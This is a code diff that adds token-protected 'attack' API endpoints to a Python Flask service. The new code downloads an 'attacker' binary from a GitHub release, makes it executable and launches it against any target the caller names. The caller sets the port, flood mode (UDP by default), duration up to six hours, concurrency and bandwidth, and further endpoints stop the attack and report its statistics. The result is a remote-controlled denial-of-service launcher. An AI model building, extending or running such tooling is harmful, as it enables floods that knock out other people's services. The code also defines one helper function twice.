@@ -9,6 +9,7 @@ import threading
 import datetime
 import subprocess
 import urllib.request
+import signal
 
 from flask import Flask, request, jsonify
 from flask_socketio import SocketIO, emit
@@ -260,6 +261,141 @@ def ws_disconnect():
     session_key = _sid_to_key.pop(request.sid, "")
     if session_key:
         terminal.detach_session(session_key)
+
+
+
+
+# ==================== 攻击功能 ====================
+attack_state = {
+    "running": False,
+    "pid": None,
+    "proc": None,
+    "stats": {},
+    "started_at": None,
+    "mode": "",
+}
+
+
+def _ensure_attacker():
+    """确保 attacker 二进制存在（从主仓库 Releases 下载缓存到 ~/files）"""
+    path = os.path.join(config.FILES_DIR, "attacker")
+    if os.path.exists(path) and os.path.getsize(path) > 100000:
+        return path
+    print("[attack] 下载 attacker 二进制...", flush=True)
+    try:
+        url = f"https://api.github.com/repos/{config.MAIN_REPO}/releases/tags/attacker"
+        status, d = core.gh_request("GET", url)
+        for a in d.get("assets", []):
+            if a.get("name") == "attacker":
+                status, blob = core.gh_request(
+                    "GET", f"https://api.github.com/repos/{config.MAIN_REPO}/releases/assets/{a['id']}",
+                    raw=True, headers={"Accept": "application/octet-stream"}, timeout=180)
+                if status == 200:
+                    with open(path, "wb") as f:
+                        f.write(blob)
+                    os.chmod(path, 0o755)
+                    print(f"[attack] attacker 下载完成: {len(blob)} 字节", flush=True)
+                    return path
+    except Exception as e:
+        print(f"[attack] 下载失败: {e}", flush=True)
+    return None
+
+
+def _attack_reader(proc):
+    """读取 attacker stdout 的 JSON 统计"""
+    global attack_state
+    try:
+        for line in proc.stdout:
+            line = line.strip()
+            if line.startswith("{"):
+                try:
+                    attack_state["stats"] = json.loads(line)
+                except Exception:
+                    pass
+    except Exception:
+        pass
+
+
+@app.route("/api/attack/start", methods=["POST"])
+def api_attack_start():
+    """启动攻击"""
+    data = request.get_json(silent=True) or {}
+    if not _check(data):
+        return jsonify(ok=False, error="未授权"), 401
+    if attack_state["running"]:
+        return jsonify(ok=False, error="已有攻击在运行"), 409
+    target = (data.get("target") or "").strip()
+    mode = (data.get("type") or "udp").strip()
+    if not target:
+        return jsonify(ok=False, error="target 必填"), 400
+    path = _ensure_attacker()
+    if not path:
+        return jsonify(ok=False, error="attacker 不可用"), 500
+    port = int(data.get("port", 80))
+    duration = int(data.get("duration", 60))
+    concurrency = int(data.get("concurrency", 100))
+    bandwidth = int(data.get("bandwidth", 0))
+    packet = int(data.get("packet_size", 1024))
+    duration = max(1, min(duration, 21600))
+    cmd = [path, "-target", target, "-port", str(port), "-mode", mode,
+           "-duration", str(duration), "-concurrency", str(concurrency),
+           "-bandwidth", str(bandwidth), "-packet", str(packet)]
+    try:
+        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                text=True, start_new_session=True)
+    except Exception as e:
+        return jsonify(ok=False, error=f"启动失败: {e}"), 500
+    attack_state.update({"running": True, "pid": proc.pid, "proc": proc,
+                         "stats": {}, "started_at": time.time(), "mode": mode})
+    threading.Thread(target=_attack_reader, args=(proc,), daemon=True).start()
+    return jsonify(ok=True, pid=proc.pid, mode=mode)
+
+
+def _attack_reader(proc):
+    global attack_state
+    try:
+        for line in proc.stdout:
+            line = line.strip()
+            if line.startswith("{"):
+                try:
+                    attack_state["stats"] = json.loads(line)
+                except Exception:
+                    pass
+    except Exception:
+        pass
+    finally:
+        attack_state["running"] = False
+
+
+@app.route("/api/attack/stop", methods=["POST"])
+def api_attack_stop():
+    data = request.get_json(silent=True) or {}
+    if not _check(data):
+        return jsonify(ok=False, error="未授权"), 401
+    if attack_state["proc"]:
+        try:
+            os.killpg(os.getpgid(attack_state["proc"].pid), signal.SIGTERM)
+            time.sleep(1)
+            os.killpg(os.getpgid(attack_state["proc"].pid), signal.SIGKILL)
+        except Exception:
+            pass
+    attack_state.update({"running": False, "proc": None, "pid": None})
+    return jsonify(ok=True)
+
+
+@app.route("/api/attack/status", methods=["GET"])
+def api_attack_status():
+    return jsonify(ok=True, running=attack_state["running"],
+                   stats=attack_state["stats"], mode=attack_state["mode"])
+
+
+def _check(data):
+    """校验 token（兼容 body token）"""
+    token = data.get("token", "") if isinstance(data, dict) else ""
+    if not token:
+        token = request.headers.get("Authorization", "").replace("Bearer ", "").strip()
+    return config.EXEC_TOKEN and token == config.EXEC_TOKEN
+
 
 
 # ==================== 后台线程 ====================
